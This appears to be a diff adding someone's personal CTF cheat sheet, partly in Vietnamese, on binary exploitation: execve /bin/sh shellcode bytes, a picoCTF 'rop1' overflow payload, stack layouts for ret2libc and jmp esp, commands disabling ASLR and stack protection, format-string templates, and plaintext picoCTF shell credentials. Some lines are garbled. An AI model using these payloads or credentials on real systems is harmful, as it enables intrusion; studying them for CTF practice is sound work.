@@ -1,0 +1,277 @@
+----------------------------------------------------------------------------fix package linux 
+http://www.mediafire.com/download/ffjrev6929qfvmt/sources.list
+sudo apt-get update
+sudo apt-get -f install
+----------------------------------------------------------------------------
+
+
+--------------------fix pip python
+python -m pip install -U pip
+python -m pip install virtualenv
+
+
+sername: pico25445 Password: 1bdbdc
+ssh pico25445@shell2014.picoctf.com -p 22
+
+
+--------------------------------------encode python
+import hashlib
+import base64
+hash=base64.standard_b64decode(str)
+hash=hashlib.md5(str).hexdigest()
+
+
+--------------------------------------executable python 
+wait:
+subprocess.call('ping 8.8.8.8', shell=True)
+
+nowait
+
+p = subprocess.Popen("chmod +x elf", stdout=subprocess.PIPE, shell=True)
+p = subprocess.Popen("./elf", stdout=subprocess.PIPE, shell=True)
+result=p.communicate()[0].strip()
+
+
+--------------------------------------fix-elf executable
+sudo dpkg --add-architecture i386
+sudo apt-get update
+sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386
+
+-----------------------auto login
+sudo apt-get install sshpass
+sshpass -p 1bdbdc ssh pico25445@shell2014.picoctf.com
+
+python -c 'print "\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"' > /tmp/shellcode
+
+---------------------------------------------------------shellcode
+
+24 byte: "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
+
+25 byte: "\x31\xc0\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\xb0\x3b\x48\x89\xe7\x31\xf6\x31\xd2\x0f\x05"
+
+
+
+
+\x31\xd2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
+or 
+\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80
+
+ex:rop1 picoctf
+python -c 'print "\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80" + "A"*55 + "\x86\x8d\x04\x08" '
+
+sudo apt-get install prelink
+sudo gedit /etc/default/prelink
+(edit "PRELINKING=unknown from unknown" to "yes")
+sudo /etc/cron.daily/prelink
+-->Automatic Prelinking After Program Are Installed
+sudo gedit /etc/apt/apt.conf
+DPkg:ost-Invoke {"echo Running prelink, please wait...;/etc/cron.daily/prelink";}
+
+
+
+---------------------------------------------------------Forensics
+grep "192.168.1.1\s" | wc -l
+Chú thích: 
+grep \s : lệnh dùng để lọc để kết quả ra chính xác ip 192.168.1.1 loại trừ các trường hợp 192.168.1.10 & 192.168.1.123
+wc -l : lệnh dùng để đếm kết hợp "-l" option đếm dòng
+
+
+------------------------------------------------------CRYPTOGRAPHY
+-----------xortool
+git clone https://github.com/hellman/xortool.git
+python setup.py install
+if no name module is docopt(wget
+https://pypi.python.org/packages/a2/55/8f8cab2afd404cf578136ef2cc5dfb50baa1761b68c9da1fb1e4eed343c9/docopt-0.6.2.tar.gz
+python setup.py install)
+
+PIL (Pillow)
+pip install Pillow
+
+
+---------------------------------------------------------Binary
+Address Space Layout Randomization (ASLR)
+No-eXecutable (NX)
+Stack Smashing Protector (SSP)
+FORTIFY
+RELocation Read-Only
+
+
+
+----------------find func offset
+readelf -s /usr/lib/lib<example>.so.XX.x | grep <OBJECT_abc>
+
+
+
+---------run elf x86 on x64
+sudo apt-get install libc6:i386 libncurses5:i386 libstdc++6:i386
+
+-----gcc:32bit
+sudo apt-get install g++-multilib
+
+
+---------------Find ROP
+git clone https://github.com/sashs/Ropper
+cd ropper
+git submodule init
+git submodule update
+python setup.py install
+
+python Ropper.py --file ../SimpleBoF --search "% rdi"
+
+
+or.
+http://shell-storm.org/project/ROPgadget/
+git clone https://github.com/JonathanSalwan/ROPgadget
+sudo apt-get install python-capstone
+cd ROPgadget
+python setup.py install
+
+
+----------FInd /bin/sh string
+https://github.com/Naetw/CTF-pwn-tips/blob/master/README.md#find-binsh-or-sh-in-library
+strings -tx /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
+
+
+----------Find Instruction
+ropper --file SimpleBoF --search "% rdi"
+
+----------Find Symboy in Library:
+ldd leak
+find Offset_Function:
+readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep system
+
+
+---------------Socat Server
+git clone https://github.com/craSH/socat
+	cd socat-1.7.3.0
+	./configure
+	make
+	su
+	make install	# installs socat, filan, and procan in /usr/local/bin
+
+
+socat TCP-LISTEN:9999,reuseaddr,fork EXEC:./leak
+
+
+----------------------------buffer overflow
+b (byte) = 1 byte: 8 bits
+w (word) = 2 byte: 16 bits
+l (long) = 4 byte: 32 bits
+q (quad) = 8 byte: 64 bits
+
+
+-----------------------call to system("/bin/sh")
+--Find Address: GDB:
+	print system   -->address
+	find "/bin/sh" -->address
+	
+--STACK:	
+LOW ---------------------------> HIGH ADDRESS
+...|pading |  EIP     | return ADDESS 1 | return ADDESS 2|  
+   |buffer | system() | "xxxx"          | /bin/sh|
+   
+   
+ 
+-----------------------call %eax
+--find Address:
+	objdump -d overflow | grep call
+	
+--STACK:	
+   | buffer                                                         | EBP | EIP              |
+   |SHELLCODE=[Nops+shellcode,shellcode],EBP-[Nops,"A"]*EBP-len(SHELLCODE)| call eax address |
+   
+-----------------------gets write to datasegment
+--STACK:	
+
+-----------------------jmp to esp
+--find Address:
+	objdump -d overflow | grep jmp
+	???
+--STACK:	
+	
+
+-----------------------jmp to esp 2:   
+***Notice:ASLR:off
+--GDB:
+	x/20wx $esp+0x10
+--STACK:	
+|buff         |EBP|            EIP|            ...           |...
+|"A"*EBP-LEN(BUFF)|address of ESP |[Nops+shellcode,shellcode]|
+
+
+
+
+------------------------------------------ANTI Bufferoverflow
+
+Address space layout randomization (ASLR): ANTI Bufferoverflow
+Turn off:
+echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space
+
+Turn On:
+echo "2" | sudo dd of=/proc/sys/kernel/randomize_va_space
+
+
+
+(gdb) 
+ON:
+set disable-randomization off
+OFF:
+set disable-randomization on
+show disable-randomization
+
+
+
+complier: 
+gcc -m32 -z -fno-stack-protector execstack shell.c -o shell
+gcc -ggdb -mpreferred-stack-boundary=2 -fno-stack-protector -z execstack -o vuln vuln.c
+
+:turn off stack smashing detected
+gcc  -fno-stack-protector vuln.c -g -o vuln
+
+------------------core dump
+set use-coredump-filter on
+
+
+------------------FIND EIP,OFFSET Adress
+-->create Word
+Eg: 200
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 200
+
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
+
+-->find offset address
+eg: 0x80485a9
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x80485a9
+
+
+-------------------------------------------------------------------tool
+--------------------------checksec tool
+(NX enabled: writable memory should be executed)
+
+cd ~/
+git clone https://github.com/slimm609/checksec.sh.git
+
+-------------------------ussage
+~/checksec.sh/checksec -f rop1
+
+----------------------------Peda exploit tool(GDB PEDA)
+
+git clone https://github.com/longld/peda.git ~/peda
+echo "source ~/peda/peda.py" >> ~/.gdbinit
+echo "DONE! debug your program with gdb and enjoy"
+
+
+--------------------------------------------------------------------------------format string exploits
+
+http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html
+
+<address><address+2>%<number>x%<offset>$hn%<other number>x%<offset+1>$hn
+
+-----------------------------------------------------------------------------------
+-->file type
+	file tutorial
+	tutorial: ELF 64-bit LSB  executable, x86-64, version 1 (SYSV)
+	
+-->Show All Function
+objdump -d overflow2 | grep "shell"
+-----------------------------------------------------------
